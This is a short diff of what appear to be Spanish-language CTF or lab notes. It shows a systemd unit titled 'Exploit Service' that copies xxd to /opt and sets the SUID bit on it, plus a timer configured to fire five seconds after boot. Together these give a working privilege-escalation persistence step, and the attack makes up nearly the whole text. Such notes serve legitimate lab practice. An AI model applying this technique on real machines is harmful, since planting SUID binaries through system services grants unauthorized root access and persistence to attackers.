@@ -535,3 +535,14 @@ Description=Exploit Service
 Type=oneshot
 ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
 comte@ip-10-64-153-69:/etc/systemd/system$ 
+
+
+modifique exploit.timer y lo onfigure en 5 segundos  :
+
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=5
+
+
+
